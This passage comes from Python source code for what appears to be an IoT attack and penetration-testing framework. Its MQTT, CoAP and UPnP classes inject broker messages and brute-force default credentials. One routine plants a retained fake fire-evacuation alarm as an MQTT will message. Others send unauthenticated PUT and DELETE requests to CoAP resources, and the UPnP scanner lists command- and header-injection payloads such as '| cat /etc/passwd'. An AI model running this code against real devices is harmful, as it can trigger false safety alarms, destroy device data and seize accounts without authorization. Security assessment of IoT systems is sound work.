            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            pkt = self._build_connect_packet(username=username, password=password)
            sock.sendall(pkt)
            resp = sock.recv(4096)
            _, rc = self._parse_connack(resp)
            if rc != 0:
                sock.close()
                return False

            pub_pkt = self._build_publish_packet(topic, message, qos=qos, retain=retain)
            sock.sendall(pub_pkt)

            # For QoS 1, wait for PUBACK
            if qos >= 1:
                sock.settimeout(3.0)
                try:
                    ack = sock.recv(4096)
                    ack_type = (ack[0] >> 4) & 0x0F
                    if ack_type != MQTTPacketType.PUBACK:
                        sock.close()
                        return False
                except socket.timeout:
                    sock.close()
                    return False

            sock.sendall(self._build_disconnect_packet())
            sock.close()

            finding = IoTFinding(
                finding_type=FindingType.MQTT_PUBLISH_INJECT,
                severity=Severity.CRITICAL,
                title="MQTT Message Injection Possible",
                description=(
                    f"Successfully published to topic '{topic}' on {host}:{port}. "
                    "An attacker could inject false sensor data, trigger actuators, "
                    "or disrupt IoT operations."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MQTT,
                evidence=f"Published {len(message)} bytes to '{topic}' QoS={qos}",
                remediation=(
                    "Implement publish ACLs. Use TLS client certificates. "
                    "Validate message payloads on subscribers."
                ),
                cvss_score=9.1,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

            logger.info("Published inject to %s:%d topic=%s", host, port, topic)
            return True

        except (OSError, ConnectionError) as e:
            logger.debug("Publish inject failed %s:%d: %s", host, port, e)
            return False

    def test_qos_abuse(self, host: str, port: int = MQTT_DEFAULT_PORT,
                        username: str = "", password: str = "") -> IoTFinding:
        """Test QoS level abuse — subscribe with QoS 2 to force broker state."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            pkt = self._build_connect_packet(
                username=username, password=password, clean_session=False
            )
            sock.sendall(pkt)
            resp = sock.recv(4096)
            _, rc = self._parse_connack(resp)
            if rc != 0:
                sock.close()
                return IoTFinding(
                    finding_type=FindingType.INFO_DISCLOSURE,
                    severity=Severity.INFO,
                    title="MQTT QoS Abuse Test — Connection Failed",
                    target=host, port=port, protocol=IoTProtocol.MQTT,
                )

            # Subscribe with QoS 2 to multiple topics
            qos2_topics = ["#", "$SYS/#", "sensor/#", "control/#"]
            granted_qos2 = False

            for i, topic in enumerate(qos2_topics):
                sub_pkt = self._build_subscribe_packet(i + 1, topic, qos=2)
                sock.sendall(sub_pkt)
                try:
                    resp = sock.recv(4096)
                    _pid, granted = self._parse_suback(resp)
                    if granted and granted[0] == 2:
                        granted_qos2 = True
                except socket.timeout:
                    continue

            sock.sendall(self._build_disconnect_packet())
            sock.close()

            if granted_qos2:
                finding = IoTFinding(
                    finding_type=FindingType.PROTOCOL_ABUSE,
                    severity=Severity.MEDIUM,
                    title="MQTT QoS 2 Subscription Granted",
                    description=(
                        f"Broker {host}:{port} grants QoS 2 subscriptions. "
                        "This forces the broker to maintain session state and "
                        "perform 4-way handshake per message, enabling resource "
                        "exhaustion attacks."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.MQTT,
                    evidence="SUBACK granted QoS 2 for wildcard topics",
                    remediation="Limit maximum QoS level. Implement rate limiting.",
                    cvss_score=5.3,
                    confidence=0.9,
                )
                with self._lock:
                    self._findings.append(finding)
                return finding

            return IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.INFO,
                title="MQTT QoS 2 Not Granted",
                target=host, port=port, protocol=IoTProtocol.MQTT,
            )

        except (OSError, ConnectionError) as e:
            logger.debug("QoS abuse test failed %s:%d: %s", host, port, e)
            return IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.INFO,
                title="MQTT QoS Abuse Test Failed",
                target=host, port=port, protocol=IoTProtocol.MQTT,
            )

    def test_will_message(self, host: str, port: int = MQTT_DEFAULT_PORT,
                           username: str = "", password: str = "") -> IoTFinding:
        """Test Last Will and Testament abuse."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            # Set a will message that could trigger actions on other clients
            will_topic = "alarm/fire"
            will_message = '{"alert":"fire","zone":"all","action":"evacuate"}'

            pkt = self._build_connect_packet(
                username=username, password=password,
                will_topic=will_topic,
                will_message=will_message,
                will_qos=1,
                will_retain=True,
            )
            sock.sendall(pkt)
            resp = sock.recv(4096)
            _, rc = self._parse_connack(resp)

            if rc == 0:
                # Connection accepted with will message — abruptly disconnect
                sock.close()  # No DISCONNECT packet = will message published

                finding = IoTFinding(
                    finding_type=FindingType.PROTOCOL_ABUSE,
                    severity=Severity.HIGH,
                    title="MQTT Will Message Abuse Possible",
                    description=(
                        f"Broker {host}:{port} accepts arbitrary will messages "
                        "with retain flag. Attacker can set malicious will "
                        "messages on safety-critical topics that persist and "
                        "trigger false alarms."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.MQTT,
                    evidence=f"Will set on '{will_topic}' with retain=True accepted",
                    remediation=(
                        "Restrict will message topics via ACLs. Disable retain "
                        "for sensitive topics. Validate will payloads."
                    ),
                    cvss_score=7.1,
                    confidence=0.85,
                )
                with self._lock:
                    self._findings.append(finding)
                return finding

            sock.close()
            return IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.INFO,
                title="MQTT Will Message Test — Connection Refused",
                target=host, port=port, protocol=IoTProtocol.MQTT,
            )

        except (OSError, ConnectionError) as e:
            logger.debug("Will message test failed %s:%d: %s", host, port, e)
            return IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.INFO,
                title="MQTT Will Message Test Failed",
                target=host, port=port, protocol=IoTProtocol.MQTT,
            )

    def brute_credentials(self, host: str, port: int = MQTT_DEFAULT_PORT,
                           cred_list: Optional[List[Tuple[str, str]]] = None,
                           max_attempts: int = 50) -> List[Tuple[str, str]]:
        """Brute-force MQTT credentials from a credential list."""
        if cred_list is None:
            db = DefaultCredDB()
            mqtt_creds = db.get_credentials_for_protocol("mqtt")
            cred_list = [(c["username"], c["password"]) for c in mqtt_creds]
            # Add common MQTT-specific creds
            cred_list.extend([
                ("mosquitto", "mosquitto"), ("mqtt", "mqtt"),
                ("admin", "public"), ("iot", "iot"),
                ("device", "device"), ("broker", "broker"),
            ])

        valid_creds: List[Tuple[str, str]] = []
        attempts = 0

        for username, password in cred_list:
            if attempts >= max_attempts:
                break
            attempts += 1

            success, rc = self.connect(host, port, username, password)
            if success:
                valid_creds.append((username, password))
                finding = IoTFinding(
                    finding_type=FindingType.DEFAULT_CRED,
                    severity=Severity.CRITICAL,
                    title=f"MQTT Default Credentials: {username}",
                    description=(
                        f"MQTT broker {host}:{port} accepts default credentials "
                        f"'{username}:{password}'."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.MQTT,
                    evidence=f"CONNACK rc=0 with {username}:{password}",
                    remediation="Change default credentials immediately.",
                    cvss_score=9.8,
                    confidence=1.0,
                )
                with self._lock:
                    self._findings.append(finding)
                logger.info("Valid MQTT creds found: %s:%s@%s:%d",
                           username, password, host, port)

            # Small delay to avoid flooding
            time.sleep(0.1)

        return valid_creds

    def full_test(self, host: str, port: int = MQTT_DEFAULT_PORT,
                   username: str = "", password: str = "") -> List[IoTFinding]:
        """Run all MQTT tests against a broker."""
        results: List[IoTFinding] = []

        # 1. Test anonymous access
        anon_finding = self.test_anonymous_access(host, port)
        results.append(anon_finding)

        # Determine credentials to use for further tests
        test_user = username
        test_pass = password
        if anon_finding.severity == Severity.CRITICAL:
            test_user = ""
            test_pass = ""
        elif not test_user:
            # Try brute-force
            valid = self.brute_credentials(host, port)
            if valid:
                test_user, test_pass = valid[0]
                results.extend([f for f in self._findings
                               if f.finding_type == FindingType.DEFAULT_CRED])

        # 2. Wildcard subscription
        messages = self.subscribe_wildcard(host, port, test_user, test_pass)
        if messages:
            results.extend([f for f in self._findings
                           if f.finding_type == FindingType.MQTT_WILDCARD_SUB
                           and f not in results])

        # 3. Topic enumeration
        topics = self.enumerate_topics(host, port, test_user, test_pass)
        if topics:
            results.append(IoTFinding(
                finding_type=FindingType.COAP_RESOURCE_ENUM,
                severity=Severity.MEDIUM,
                title=f"MQTT Topic Enumeration: {len(topics)} topics",
                description=f"Enumerated {len(topics)} MQTT topics on {host}:{port}.",
                target=host, port=port, protocol=IoTProtocol.MQTT,
                evidence=f"Topics: {topics[:30]}",
                confidence=0.95,
            ))

        # 4. Publish injection test
        if topics:
            test_topic = topics[0] if topics[0] != "#" else "siren/test"
            test_msg = b'{"siren_test":true,"timestamp":' + str(time.time()).encode() + b'}'
            self.publish_inject(host, test_topic, test_msg, port, test_user, test_pass)

        # 5. QoS abuse
        qos_finding = self.test_qos_abuse(host, port, test_user, test_pass)
        results.append(qos_finding)

        # 6. Will message abuse
        will_finding = self.test_will_message(host, port, test_user, test_pass)
        results.append(will_finding)

        with self._lock:
            all_findings = list(self._findings)
        for f in all_findings:
            if f not in results:
                results.append(f)

        return results

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            return {
                "findings": [f.to_dict() for f in self._findings],
                "message_count": self._message_count,
                "topics_seen": list(self._subscribed_topics.keys()),
                "connected": self._connected,
            }


# ════════════════════════════════════════════════════════════════════════════════
# CoAP EXPLOITER
# ════════════════════════════════════════════════════════════════════════════════

class CoAPExploiter:
    """
    CoAP (Constrained Application Protocol) exploitation engine.

    Tests CoAP endpoints for resource discovery, unauthorized CRUD operations,
    observe subscriptions, and block-wise transfer abuse.

    Usage:
        coap = CoAPExploiter()
        findings = coap.full_test("192.168.1.50")
    """

    # Well-known CoAP resources
    WELL_KNOWN_RESOURCES: List[str] = [
        "/.well-known/core",
        "/sensor", "/sensor/temperature", "/sensor/humidity",
        "/sensor/pressure", "/sensor/light", "/sensor/motion",
        "/sensor/co2", "/sensor/pm25", "/sensor/noise",
        "/actuator", "/actuator/led", "/actuator/relay",
        "/actuator/valve", "/actuator/motor", "/actuator/alarm",
        "/config", "/config/network", "/config/device",
        "/config/firmware", "/config/security",
        "/status", "/status/battery", "/status/uptime",
        "/firmware", "/firmware/version", "/firmware/update",
        "/data", "/data/log", "/data/history",
        "/control", "/control/reboot", "/control/reset",
        "/api", "/api/v1", "/api/devices",
        "/rd", "/rd/lookup", "/ps",
        "/light", "/temperature", "/humidity",
        "/door", "/lock", "/switch",
        "/meter", "/energy", "/power",
    ]

    # CoAP option numbers
    OPT_IF_MATCH = 1
    OPT_URI_HOST = 3
    OPT_ETAG = 4
    OPT_IF_NONE_MATCH = 5
    OPT_OBSERVE = 6
    OPT_URI_PORT = 7
    OPT_URI_PATH = 11
    OPT_CONTENT_FORMAT = 12
    OPT_MAX_AGE = 14
    OPT_URI_QUERY = 15
    OPT_ACCEPT = 17
    OPT_BLOCK2 = 23
    OPT_BLOCK1 = 27
    OPT_SIZE2 = 28
    OPT_SIZE1 = 60

    # Content formats
    TEXT_PLAIN = 0
    APP_LINK_FORMAT = 40
    APP_XML = 41
    APP_OCTET_STREAM = 42
    APP_JSON = 50
    APP_CBOR = 60

    def __init__(self, timeout: float = DEFAULT_TIMEOUT) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._findings: List[IoTFinding] = []
        self._discovered_resources: List[str] = []
        self._message_id = 0
        self._token_counter = 0
        logger.info("CoAPExploiter initialized")

    def _next_message_id(self) -> int:
        """Get next CoAP message ID."""
        with self._lock:
            self._message_id = (self._message_id + 1) & 0xFFFF
            return self._message_id

    def _next_token(self) -> bytes:
        """Generate next CoAP token."""
        with self._lock:
            self._token_counter += 1
            return struct.pack("!H", self._token_counter & 0xFFFF)

    def _build_coap_packet(self, msg_type: CoAPType, method: CoAPMethod,
                            uri_path: str, token: Optional[bytes] = None,
                            payload: bytes = b"",
                            options: Optional[List[Tuple[int, bytes]]] = None,
                            content_format: Optional[int] = None,
                            observe: Optional[int] = None,
                            block2: Optional[Tuple[int, bool, int]] = None) -> bytes:
        """Build a CoAP message packet."""
        if token is None:
            token = self._next_token()
        msg_id = self._next_message_id()

        # Header: Ver(2) | Type(2) | TKL(4) | Code(8) | Message ID(16)
        ver = 1
        tkl = len(token)
        header = bytes([
            (ver << 6) | (msg_type << 4) | tkl,
            method,
        ]) + struct.pack("!H", msg_id)

        # Build options list
        opt_list: List[Tuple[int, bytes]] = []

        if observe is not None:
            if observe == 0:
                opt_list.append((self.OPT_OBSERVE, b"\x00"))
            else:
                opt_list.append((self.OPT_OBSERVE, b"\x01"))

        # URI-Path options (split by /)
        parts = [p for p in uri_path.split("/") if p]
        for part in parts:
            opt_list.append((self.OPT_URI_PATH, part.encode("utf-8")))

        if content_format is not None:
            if content_format < 256:
                opt_list.append((self.OPT_CONTENT_FORMAT, bytes([content_format])))
            else:
                opt_list.append((self.OPT_CONTENT_FORMAT,
                                struct.pack("!H", content_format)))

        if block2 is not None:
            num, more, szx = block2
            block_val = (num << 4) | (int(more) << 3) | szx
            if block_val < 256:
                opt_list.append((self.OPT_BLOCK2, bytes([block_val])))
            else:
                opt_list.append((self.OPT_BLOCK2, struct.pack("!H", block_val)))

        if options:
            opt_list.extend(options)

        # Sort by option number and encode
        opt_list.sort(key=lambda x: x[0])
        encoded_options = b""
        prev_opt = 0
        for opt_num, opt_val in opt_list:
            delta = opt_num - prev_opt
            length = len(opt_val)

            # Encode delta
            if delta < 13:
                d_nibble = delta
                d_ext = b""
            elif delta < 269:
                d_nibble = 13
                d_ext = bytes([delta - 13])
            else:
                d_nibble = 14
                d_ext = struct.pack("!H", delta - 269)

            # Encode length
            if length < 13:
                l_nibble = length
                l_ext = b""
            elif length < 269:
                l_nibble = 13
                l_ext = bytes([length - 13])
            else:
                l_nibble = 14
                l_ext = struct.pack("!H", length - 269)

            encoded_options += bytes([(d_nibble << 4) | l_nibble]) + d_ext + l_ext + opt_val
            prev_opt = opt_num

        # Assemble packet
        packet = header + token + encoded_options
        if payload:
            packet += b"\xff" + payload

        return packet

    def _parse_coap_response(self, data: bytes) -> Dict[str, Any]:
        """Parse a CoAP response packet."""
        if len(data) < 4:
            return {"error": "packet too short"}

        ver = (data[0] >> 6) & 0x03
        msg_type = (data[0] >> 4) & 0x03
        tkl = data[0] & 0x0F
        code_class = (data[1] >> 5) & 0x07
        code_detail = data[1] & 0x1F
        msg_id = struct.unpack("!H", data[2:4])[0]

        offset = 4
        token = data[offset:offset+tkl]
        offset += tkl

        # Parse options
        options: List[Tuple[int, bytes]] = []
        prev_opt = 0
        while offset < len(data) and data[offset] != 0xFF:
            byte = data[offset]
            if byte == 0xFF:
                break
            d_nibble = (byte >> 4) & 0x0F
            l_nibble = byte & 0x0F
            offset += 1

            if d_nibble == 13:
                delta = data[offset] + 13
                offset += 1
            elif d_nibble == 14:
                delta = struct.unpack("!H", data[offset:offset+2])[0] + 269
                offset += 2
            elif d_nibble == 15:
                break
            else:
                delta = d_nibble

            if l_nibble == 13:
                length = data[offset] + 13
                offset += 1
            elif l_nibble == 14:
                length = struct.unpack("!H", data[offset:offset+2])[0] + 269
                offset += 2
            elif l_nibble == 15:
                break
            else:
                length = l_nibble

            opt_num = prev_opt + delta
            opt_val = data[offset:offset+length]
            offset += length
            options.append((opt_num, opt_val))
            prev_opt = opt_num

        # Extract payload
        payload = b""
        if offset < len(data) and data[offset] == 0xFF:
            payload = data[offset+1:]

        return {
            "version": ver,
            "type": msg_type,
            "token": token,
            "code_class": code_class,
            "code_detail": code_detail,
            "code": f"{code_class}.{code_detail:02d}",
            "message_id": msg_id,
            "options": options,
            "payload": payload,
        }

    def _send_coap(self, host: str, port: int, packet: bytes) -> Dict[str, Any]:
        """Send CoAP packet and receive response."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self._timeout)
            sock.sendto(packet, (host, port))
            data, _addr = sock.recvfrom(4096)
            sock.close()
            return self._parse_coap_response(data)
        except (OSError, socket.timeout) as e:
            logger.debug("CoAP send failed %s:%d: %s", host, port, e)
            return {"error": str(e)}

    def discover_resources(self, host: str,
                            port: int = COAP_DEFAULT_PORT) -> List[str]:
        """Discover CoAP resources via .well-known/core."""
        resources: List[str] = []

        # Request .well-known/core
        pkt = self._build_coap_packet(
            CoAPType.CON, CoAPMethod.GET, "/.well-known/core"
        )
        resp = self._send_coap(host, port, pkt)

        if "error" not in resp and resp.get("code_class") == 2:
            payload = resp.get("payload", b"")
            if payload:
                # Parse CoRE Link Format
                text = payload.decode("utf-8", errors="replace")
                links = text.split(",")
                for link in links:
                    match = re.search(r"<([^>]+)>", link)
                    if match:
                        resources.append(match.group(1))

            finding = IoTFinding(
                finding_type=FindingType.COAP_RESOURCE_ENUM,
                severity=Severity.MEDIUM,
                title=f"CoAP Resource Discovery: {len(resources)} resources",
                description=(
                    f"CoAP endpoint {host}:{port} exposes .well-known/core "
                    f"with {len(resources)} discoverable resources."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.COAP,
                evidence=f"Resources: {resources[:20]}",
                remediation="Restrict .well-known/core access. Use DTLS.",
                cvss_score=5.3,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
                self._discovered_resources = resources

        # Also probe common resources
        for path in self.WELL_KNOWN_RESOURCES:
            if path in resources:
                continue
            pkt = self._build_coap_packet(CoAPType.CON, CoAPMethod.GET, path)
            resp = self._send_coap(host, port, pkt)
            if "error" not in resp and resp.get("code_class") == 2:
                resources.append(path)

        logger.info("Discovered %d CoAP resources on %s:%d", len(resources), host, port)
        return resources

    def get_resource(self, host: str, path: str,
                      port: int = COAP_DEFAULT_PORT) -> Dict[str, Any]:
        """GET a CoAP resource."""
        pkt = self._build_coap_packet(CoAPType.CON, CoAPMethod.GET, path)
        return self._send_coap(host, port, pkt)

    def put_resource(self, host: str, path: str, payload: bytes,
                      port: int = COAP_DEFAULT_PORT,
                      content_format: int = APP_JSON) -> Dict[str, Any]:
        """PUT (update) a CoAP resource."""
        pkt = self._build_coap_packet(
            CoAPType.CON, CoAPMethod.PUT, path,
            payload=payload, content_format=content_format
        )
        resp = self._send_coap(host, port, pkt)

        if "error" not in resp and resp.get("code_class") == 2:
            finding = IoTFinding(
                finding_type=FindingType.PROTOCOL_ABUSE,
                severity=Severity.HIGH,
                title=f"CoAP Unauthorized PUT: {path}",
                description=(
                    f"Successfully wrote to CoAP resource '{path}' on "
                    f"{host}:{port} without authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.COAP,
                evidence=f"PUT {path} -> {resp.get('code')}",
                remediation="Implement DTLS and access control on CoAP resources.",
                cvss_score=8.1,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return resp

    def post_resource(self, host: str, path: str, payload: bytes,
                       port: int = COAP_DEFAULT_PORT,
                       content_format: int = APP_JSON) -> Dict[str, Any]:
        """POST (create) a CoAP resource."""
        pkt = self._build_coap_packet(
            CoAPType.CON, CoAPMethod.POST, path,
            payload=payload, content_format=content_format
        )
        resp = self._send_coap(host, port, pkt)

        if "error" not in resp and resp.get("code_class") == 2:
            finding = IoTFinding(
                finding_type=FindingType.PROTOCOL_ABUSE,
                severity=Severity.HIGH,
                title=f"CoAP Unauthorized POST: {path}",
                description=(
                    f"Successfully created resource via POST on '{path}' at "
                    f"{host}:{port} without authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.COAP,
                evidence=f"POST {path} -> {resp.get('code')}",
                remediation="Implement DTLS and access control on CoAP resources.",
                cvss_score=7.5,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return resp

    def delete_resource(self, host: str, path: str,
                         port: int = COAP_DEFAULT_PORT) -> Dict[str, Any]:
        """DELETE a CoAP resource."""
        pkt = self._build_coap_packet(CoAPType.CON, CoAPMethod.DELETE, path)
        resp = self._send_coap(host, port, pkt)

        if "error" not in resp and resp.get("code_class") == 2:
            finding = IoTFinding(
                finding_type=FindingType.PROTOCOL_ABUSE,
                severity=Severity.CRITICAL,
                title=f"CoAP Unauthorized DELETE: {path}",
                description=(
                    f"Successfully deleted CoAP resource '{path}' on "
                    f"{host}:{port} without authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.COAP,
                evidence=f"DELETE {path} -> {resp.get('code')}",
                remediation="Implement DTLS and access control. Disable DELETE method.",
                cvss_score=9.1,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return resp

    def observe_resource(self, host: str, path: str,
                          port: int = COAP_DEFAULT_PORT,
                          duration: float = 10.0) -> List[Dict[str, Any]]:
        """Observe (subscribe to) a CoAP resource for changes."""
        observations: List[Dict[str, Any]] = []

        pkt = self._build_coap_packet(
            CoAPType.CON, CoAPMethod.GET, path, observe=0
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            sock.sendto(pkt, (host, port))

            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data, _addr = sock.recvfrom(4096)
                    resp = self._parse_coap_response(data)
                    if "error" not in resp:
                        observations.append(resp)
                        # Send ACK for CON messages
                        if resp.get("type") == CoAPType.CON:
                            ack = struct.pack("!BBH",
                                              0x60,  # Ver=1, Type=ACK, TKL=0
                                              0x00,  # Empty code
                                              resp["message_id"])
                            sock.sendto(ack, (host, port))
                except socket.timeout:
                    continue

            sock.close()

            if observations:
                finding = IoTFinding(
                    finding_type=FindingType.INFO_DISCLOSURE,
                    severity=Severity.MEDIUM,
                    title=f"CoAP Observe Allowed: {path}",
                    description=(
                        f"CoAP resource '{path}' on {host}:{port} allows "
                        f"observation. Received {len(observations)} notifications."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.COAP,
                    evidence=f"Observed {len(observations)} updates on {path}",
                    remediation="Restrict observe subscriptions. Use DTLS.",
                    cvss_score=4.3,
                    confidence=0.9,
                )
                with self._lock:
                    self._findings.append(finding)

        except (OSError, socket.timeout) as e:
            logger.debug("Observe failed %s:%d%s: %s", host, port, path, e)

        return observations

    def test_blockwise_transfer(self, host: str, path: str,
                                  port: int = COAP_DEFAULT_PORT,
                                  block_size: int = 64) -> List[bytes]:
        """Test block-wise transfer to retrieve large resources."""
        blocks: List[bytes] = []
        block_num = 0
        szx = {16: 0, 32: 1, 64: 2, 128: 3, 256: 4, 512: 5, 1024: 6}.get(block_size, 2)

        while True:
            pkt = self._build_coap_packet(
                CoAPType.CON, CoAPMethod.GET, path,
                block2=(block_num, False, szx)
            )
            resp = self._send_coap(host, port, pkt)

            if "error" in resp or resp.get("code_class") != 2:
                break

            payload = resp.get("payload", b"")
            if payload:
                blocks.append(payload)

            # Check Block2 option for more blocks
            has_more = False
            for opt_num, opt_val in resp.get("options", []):
                if opt_num == self.OPT_BLOCK2:
                    if len(opt_val) == 1:
                        block_val = opt_val[0]
                    elif len(opt_val) == 2:
                        block_val = struct.unpack("!H", opt_val)[0]
                    else:
                        block_val = 0
                    has_more = bool((block_val >> 3) & 0x01)

            if not has_more:
                break
            block_num += 1

            if block_num > 1000:  # Safety limit
                break

        if len(blocks) > 1:
            logger.info("Block-wise transfer: %d blocks from %s:%d%s",
                        len(blocks), host, port, path)

        return blocks

    def test_no_dtls(self, host: str, port: int = COAP_DEFAULT_PORT) -> IoTFinding:
        """Test if CoAP endpoint operates without DTLS encryption."""
        pkt = self._build_coap_packet(
            CoAPType.CON, CoAPMethod.GET, "/.well-known/core"
        )
        resp = self._send_coap(host, port, pkt)

        if "error" not in resp:
            finding = IoTFinding(
                finding_type=FindingType.COAP_NO_DTLS,
                severity=Severity.HIGH,
                title="CoAP Without DTLS Encryption",
                description=(
                    f"CoAP endpoint {host}:{port} responds on plain UDP "
                    "without DTLS. All communications are unencrypted."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.COAP,
                evidence=f"Plain CoAP response received: code={resp.get('code')}",
                remediation=(
                    "Enable DTLS on CoAP endpoints. Use port 5684 for coaps://. "
                    "Implement PSK or certificate-based authentication."
                ),
                cvss_score=7.5,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return finding

        return IoTFinding(
            finding_type=FindingType.INFO_DISCLOSURE,
            severity=Severity.INFO,
            title="CoAP Endpoint Not Reachable on Plain UDP",
            target=host, port=port, protocol=IoTProtocol.COAP,
        )

    def full_test(self, host: str, port: int = COAP_DEFAULT_PORT) -> List[IoTFinding]:
        """Run all CoAP tests against an endpoint."""
        results: List[IoTFinding] = []

        # 1. Test no DTLS
        dtls_finding = self.test_no_dtls(host, port)
        results.append(dtls_finding)

        # 2. Resource discovery
        resources = self.discover_resources(host, port)

        # 3. Test CRUD on discovered resources
        for resource in resources[:15]:  # Limit to first 15
            # GET
            get_resp = self.get_resource(host, resource, port)
            if "error" not in get_resp and get_resp.get("code_class") == 2:
                results.append(IoTFinding(
                    finding_type=FindingType.INFO_DISCLOSURE,
                    severity=Severity.LOW,
                    title=f"CoAP Resource Readable: {resource}",
                    description=f"Resource {resource} is readable without auth.",
                    target=host, port=port, protocol=IoTProtocol.COAP,
                    evidence=f"GET {resource} -> {get_resp.get('code')}",
                    confidence=1.0,
                ))

            # PUT test (with harmless payload)
            test_payload = b'{"siren_test":true}'
            self.put_resource(host, resource, test_payload, port)

            # Observe test on sensor-like resources
            if any(kw in resource for kw in ["sensor", "temperature", "humidity",
                                               "pressure", "data"]):
                self.observe_resource(host, resource, port, duration=5.0)

        # 4. Block-wise transfer test
        if resources:
            self.test_blockwise_transfer(host, resources[0], port)

        # Collect all findings
        with self._lock:
            for f in self._findings:
                if f not in results:
                    results.append(f)

        return results

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            return {
                "findings": [f.to_dict() for f in self._findings],
                "discovered_resources": self._discovered_resources,
                "message_id": self._message_id,
            }


# ════════════════════════════════════════════════════════════════════════════════
# UPnP SCANNER
# ════════════════════════════════════════════════════════════════════════════════

class UPnPScanner:
    """
    UPnP (Universal Plug and Play) scanner and exploitation engine.

    Discovers UPnP devices via M-SEARCH, parses device XML descriptions,
    tests for SOAP injection vulnerabilities, and abuses port mapping.

    Usage:
        upnp = UPnPScanner()
        findings = upnp.full_test("192.168.1.0/24")
    """

    # UPnP service types to search
    SEARCH_TARGETS: List[str] = [
        "ssdp:all",
        "upnp:rootdevice",
        "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
        "urn:schemas-upnp-org:device:InternetGatewayDevice:2",
        "urn:schemas-upnp-org:service:WANIPConnection:1",
        "urn:schemas-upnp-org:service:WANIPConnection:2",
        "urn:schemas-upnp-org:service:WANPPPConnection:1",
        "urn:schemas-upnp-org:device:MediaServer:1",
        "urn:schemas-upnp-org:device:MediaRenderer:1",
        "urn:schemas-upnp-org:service:Layer3Forwarding:1",
        "urn:schemas-upnp-org:service:DeviceProtection:1",
        "urn:schemas-upnp-org:device:Basic:1",
    ]

    # SOAP injection payloads
    SOAP_INJECTION_PAYLOADS: List[str] = [
        '"><NewInternalClient>192.168.1.100</NewInternalClient>',
        "<!--", "]]>", "<?xml version='1.0'?>",
        '<![CDATA[<script>alert(1)</script>]]>',
        "' OR '1'='1", "; ls -la", "| cat /etc/passwd",
        "${7*7}", "{{7*7}}", "%0aHost: evil.com",
    ]

    def __init__(self, timeout: float = DEFAULT_TIMEOUT) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._findings: List[IoTFinding] = []
        self._discovered_devices: List[Dict[str, Any]] = []
        self._services: List[Dict[str, Any]] = []
        logger.info("UPnPScanner initialized")

    def _build_msearch(self, search_target: str = "ssdp:all",
                        mx: int = 3) -> bytes:
        """Build an M-SEARCH discovery request."""
        request = (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {UPNP_MULTICAST_ADDR}:{UPNP_MULTICAST_PORT}\r\n"
            'MAN: "ssdp:discover"\r\n'
            f"MX: {mx}\r\n"
            f"ST: {search_target}\r\n"
            "\r\n"
        )
        return request.encode("utf-8")

    def _parse_ssdp_response(self, data: bytes) -> Dict[str, str]:
        """Parse SSDP M-SEARCH response headers."""
        headers: Dict[str, str] = {}
        text = data.decode("utf-8", errors="replace")
        lines = text.split("\r\n")

        for line in lines:
            if ":" in line:
                key, _, value = line.partition(":")
                headers[key.strip().upper()] = value.strip()

        return headers

    def msearch_discover(self, timeout: float = 5.0,
                          search_target: str = "ssdp:all") -> List[Dict[str, str]]:
        """Send M-SEARCH and collect UPnP device responses."""
        responses: List[Dict[str, str]] = []

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                                 socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(timeout)

            # Send M-SEARCH
            msearch = self._build_msearch(search_target)
            sock.sendto(msearch, (UPNP_MULTICAST_ADDR, UPNP_MULTICAST_PORT))

            # Collect responses
            end_time = time.time() + timeout
            while time.time() < end_time:
                try:
                    data, addr = sock.recvfrom(4096)
                    headers = self._parse_ssdp_response(data)
                    headers["_SOURCE_IP"] = addr[0]
                    headers["_SOURCE_PORT"] = str(addr[1])
                    responses.append(headers)
                except socket.timeout:
                    break

            sock.close()

        except OSError as e:
            logger.debug("M-SEARCH failed: %s", e)

        with self._lock:
            self._discovered_devices.extend(responses)

        logger.info("M-SEARCH discovered %d UPnP responses", len(responses))
        return responses

    def discover_all(self, timeout: float = 5.0) -> List[Dict[str, str]]:
        """Run M-SEARCH with multiple search targets."""
        all_responses: List[Dict[str, str]] = []
        seen_locations: Set[str] = set()

